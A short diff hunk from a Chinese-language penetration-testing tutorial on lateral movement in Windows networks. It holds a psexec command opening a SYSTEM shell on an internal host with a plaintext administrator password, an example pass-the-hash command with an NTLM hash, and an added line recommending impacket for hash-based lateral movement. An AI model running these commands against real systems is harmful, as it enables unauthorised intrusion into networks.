@@ -39,6 +39,8 @@
      psexec \\192.168.3.144 -u administrator -p admin123！！ -s cmd
      
      注意官方自带的psexec只能通过明文进行传递攻击，密码是行不通的，例如 psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.144 是不可以的
+     
+    3.利用impacket中的工具包进行横向渗透，可解决密文攻击问题
 
 ## 0x03 横向移动方法4_票据攻击
 
